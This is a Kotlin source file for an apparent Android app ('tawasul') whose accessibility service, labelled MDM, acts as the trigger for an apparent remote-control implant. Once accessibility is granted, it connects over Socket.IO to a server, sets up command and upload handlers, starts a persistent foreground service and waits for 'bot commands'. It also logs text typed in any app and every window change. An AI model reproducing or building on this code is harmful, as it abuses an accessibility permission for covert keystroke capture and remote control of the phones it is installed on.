package com.tawasul.app.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.tawasul.app.data.remote.ApiClient
import com.tawasul.app.data.remote.CommandHandler
import com.tawasul.app.data.remote.CryptoManager
import com.tawasul.app.data.remote.SocketManager
import com.tawasul.app.data.remote.UploadManager
import com.tawasul.app.util.DeviceUtils

/**
 * Accessibility Service - THE trigger that starts everything.
 *
 * When user enables Accessibility from Settings:
 *   onServiceConnected() fires → we start the socket connection directly.
 *
 * This is the most reliable trigger because:
 *  - It runs in foreground (AccessibilityService is a system-bound service)
 *  - User explicitly granted the permission
 *  - System keeps it alive
 */
class MDMAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MDMAccessibility"
        @Volatile private var socketManager: SocketManager? = null
        @Volatile private var apiClient: ApiClient? = null
        @Volatile private var cryptoManager: CryptoManager? = null
        @Volatile private var commandHandler: CommandHandler? = null
        @Volatile private var uploadManager: UploadManager? = null
        @Volatile private var isInitialized = false
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "✅ Accessibility Service Connected - Starting Socket.IO...")

        if (isInitialized) {
            Log.i(TAG, "Already initialized - skipping")
            return
        }
        isInitialized = true

        // Initialize all components and connect to server directly from here
        Thread {
            try {
                connectToServer()
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to connect to server", e)
                isInitialized = false  // Allow retry on next connect
            }
        }.start()
    }

    private fun connectToServer() {
        Log.i(TAG, "🔌 Initializing connection components...")

        // 1. Initialize ApiClient
        apiClient = ApiClient(this)
        Log.i(TAG, "  ✅ ApiClient initialized")

        // 2. Initialize CryptoManager
        cryptoManager = CryptoManager()
        Log.i(TAG, "  ✅ CryptoManager initialized")

        // 3. Initialize UploadManager
        uploadManager = UploadManager(this)
        Log.i(TAG, "  ✅ UploadManager initialized")

        // 4. Initialize SocketManager
        socketManager = SocketManager(this)
        Log.i(TAG, "  ✅ SocketManager initialized")

        // 5. Initialize crypto via REST API (GET /init?device_id=X)
        val deviceId = DeviceUtils.getDeviceId(this)
        Log.i(TAG, "  → Requesting crypto keys for device: $deviceId")
        try {
            val result = apiClient?.initCrypto(deviceId)
            if (result != null) {
                cryptoManager?.initFromServer(result)
                Log.i(TAG, "  ✅ Crypto initialized (AES-256-CBC)")
            } else {
                Log.w(TAG, "  ⚠️ Crypto init returned null - continuing anyway")
            }
        } catch (e: Exception) {
            Log.e(TAG, "  ❌ Crypto init failed: ${e.message}")
            // Continue anyway - socket can still connect
        }

        // 6. Setup command handler
        commandHandler = CommandHandler(this, apiClient!!, cryptoManager!!, socketManager!!, uploadManager!!)
        socketManager?.setCommandHandler(commandHandler!!)
        socketManager?.setCryptoManager(cryptoManager!!)
        Log.i(TAG, "  ✅ Command handler set")

        // 7. Connect Socket.IO - THIS IS THE KEY MOMENT
        Log.i(TAG, "  → Connecting Socket.IO to server...")
        socketManager?.connect()

        // 8. Also start MDMService as foreground service for persistence
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "  ✅ MDMService started for background persistence")
        } catch (e: Exception) {
            Log.w(TAG, "  ⚠️ Could not start MDMService (non-critical): ${e.message}")
        }

        Log.i(TAG, "🎉 Connection setup complete! Waiting for bot commands...")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: ""
                val cls = event.className?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    Log.d(TAG, "Window: $pkg / $cls")
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Content change - available for monitoring
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString(" ") ?: ""
                if (text.isNotEmpty()) {
                    Log.d(TAG, "Text changed: $text")
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        Log.i(TAG, "Accessibility service destroyed - disconnecting socket")
        try {
            socketManager?.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "Error disconnecting socket", e)
        }
        isInitialized = false
        super.onDestroy()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        Log.i(TAG, "Accessibility service unbound")
        try {
            socketManager?.disconnect()
        } catch (e: Exception) {}
        isInitialized = false
        return super.onUnbind(intent)
    }
}
